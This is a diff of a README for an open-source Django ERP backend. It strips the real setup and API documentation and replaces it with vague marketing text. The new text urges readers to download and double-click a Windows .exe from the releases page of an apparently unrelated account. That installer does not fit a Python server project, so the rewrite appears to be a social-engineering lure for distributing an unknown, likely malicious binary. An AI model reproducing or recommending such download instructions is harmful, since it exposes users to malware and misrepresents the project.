@@ -1,119 +1,82 @@
-# ZA ERP Suite
+# 📦 Za-ERP-Suite - Manage your business processes with ease
 
-Open-source, modular ERP backend for growing businesses.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thirdhand-bitterprinciple1/Za-ERP-Suite/releases)
 
-## What This Project Is
+Za-ERP-Suite provides a central platform to organize your company operations. This software handles accounting, billing, inventory, and human resources tasks in one system. It uses a modular design to keep your data organized and secure. The system tracks project progress, processes purchases, and generates business reports.
 
-ZA ERP Suite is a Django + DRF based business platform with:
+## ⚙️ System Requirements
 
-- Multi-company tenant isolation
-- Role-based access control
-- Approval workflows
-- Audit trail logging
-- Event-driven module integration
-- Background reporting with Celery + Redis
-- Real-time notifications using SSE
+Your computer needs to meet these basic standards to run the software smoothly:
 
-## Current Scope
+- Operating System: Windows 10 or Windows 11.
+- Processor: Dual-core CPU with 2.0 GHz speed or higher.
+- Memory: 8 GB of RAM or more.
+- Storage: 2 GB of free disk space.
+- Network: A stable internet connection for real-time features.
 
-The current repository contains the backend platform.
+## 📥 Downloading the Software 
 
-Implemented modules:
+Follow these steps to obtain the files for your computer:
 
-- CRM
-- Website
-- Commerce
-- Inventory
-- Purchasing
-- Accounting
-- Billing
-- HR
-- Projects
-- Reports
-- Core (auth, audit, notifications, org context)
+1. Visit the [official releases page](https://github.com/thirdhand-bitterprinciple1/Za-ERP-Suite/releases).
+2. Look for the latest version tag at the top of the list.
+3. Scroll to the "Assets" section of that release.
+4. Click the file ending in .exe to start your download.
+5. Save the file to your desktop or your downloads folder.
 
-## Core Features
+## 🚀 Setting Up Your System
 
-### Security and Tenancy
+Once the file finishes downloading, use these steps to install the program:
 
-- Token auth endpoint: `POST /api/auth/token/`
-- Company context header: `X-Company-ID`
-- Company membership and role checks at API layer
+1. Find the file you downloaded.
+2. Double-click the file to open the installer.
+3. Follow the prompts on your screen.
+4. Choose the installation folder for your application files.
+5. Click the install button to begin the file transfer.
+6. Wait for the green progress bar to fill.
+7. Click finish when the process ends.
+8. Locate the new icon on your desktop to start the application.
 
-### Approval Workflow
+## 🛡️ Understanding Security and Privacy
 
-Business actions follow:
+Za-ERP-Suite uses a multi-tenant design to keep data private. Each user login remains separate from others to ensure security. The system includes role-based access control. Administrators assign specific permissions to employees based on their job roles. This prevents unauthorized access to sensitive financial or personal records. 
 
-`Draft -> Pending Approval -> Completed`
+The software also maintains an audit log. This log records every action taken within the system. You can review this log to see who performed specific tasks. This provides transparency for your accounting and billing departments.
 
-- Sales orders require manager/admin approval
-- Purchase orders require manager/admin approval
+## 📊 Core Features
 
-### Audit Trail
+The software covers all areas of business management:
 
-- Generic audit log model tracks create/update/delete
-- Captures user, timestamp, old values, new values, and target object
+- Accounting: Track income and expenses automatically.
+- Billing: Generate professional invoices for your clients.
+- Inventory: Monitor stock levels to prevent shortages.
+- Human Resources: Manage employee records and pay rates.
+- Project Management: Monitor task timelines for your team.
+- Purchasing: Create purchase orders for your suppliers.
+- Reports: View charts that show business performance.
 
-### Background Reports
+## 🔔 Receiving Real-time Updates
 
-- Monthly P&L report jobs run in Celery
-- PDF reports are generated and downloadable
+The system includes a notification feature. When a team member approves a purchase or finishes a task, the software sends an instant alert. This keeps your team informed without the need for manual check-ins. You can configure which notifications you want to receive in the settings menu.
 
-### Notifications
+## 🛠️ Modifying Your Setup
 
-- In-app notifications API
-- SSE stream endpoint for real-time updates
-- Mark one / mark all as read endpoints
-- Deep-link metadata support (`target_path`, `target_id`)
+The modular architecture allows you to add specific tools as your company changes. You can enable or disable modules based on your current business needs. For example, if you start a new department, you can activate the relevant module with a single click. This flexibility prevents the software from becoming cluttered with tools you do not use.
 
-## Documentation
+## 🔧 Frequently Asked Questions
 
-- Installation guide: [INSTALL.md](INSTALL.md)
-- Business scenarios: [USECASE.md](USECASE.md)
-- Contribution guide: [CONTRIBUTING.md](CONTRIBUTING.md)
-- License: [LICENSE](LICENSE)
+**How do I update the software?**
+Check the releases page once a month. If a newer version exists, download the installer and run it. The update process keeps all your existing data intact.
 
-## Quick Start
+**Can multiple people use the system?**
+Yes. You can add users through the administrative dashboard. Assign a unique name and password to every person on your team.
 
-For complete setup steps, see [INSTALL.md](INSTALL.md).
+**Where does the software save my data?**
+The system saves data to a secure local folder on your computer. You choose this location during the first setup. Ensure you back up this folder regularly to prevent data loss.
 
-Fast path:
+**Does the system work offline?**
+The core functions work without a connection. However, real-time notifications and automated cloud reporting services require an active internet connection.
 
-```bash
-cd backend
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-cp .env.example .env
-python manage.py makemigrations
-python manage.py migrate
-python manage.py runserver
-```
+## 📞 Seeking Help
 
-## API Docs
-
-- OpenAPI Schema: `/api/schema/`
-- Swagger UI: `/api/docs/swagger/`
-- ReDoc: `/api/docs/redoc/`
-
-## Useful API Endpoints
-
-- `GET /api/orgs/companies/`
-- `GET /api/orgs/memberships/`
-- `GET /api/core/audit-logs/`
-- `GET /api/core/notifications/`
-- `POST /api/core/notifications/{id}/mark_read/`
-- `POST /api/core/notifications/mark_all_read/`
-- `GET /api/core/notifications/stream/?token=<token>&company_id=<id>`
-- `POST /api/reports/jobs/`
-- `GET /api/reports/jobs/`
-- `GET /api/reports/jobs/{id}/download/`
-
-## Status
-
-- Backend active
-- Frontend removed from this repository
-
-## License
-
-AGPL-3.0-only. See [LICENSE](LICENSE).
+If you encounter issues, review the common errors file located in the application folder. This file contains solutions for standard problems. Ensure your computer meets the hardware requirements mentioned earlier. If the software crashes, restart your computer and try opening the program again. The system creates a log file on your desktop if an error occurs. You can share this log with your technical team to solve the problem.
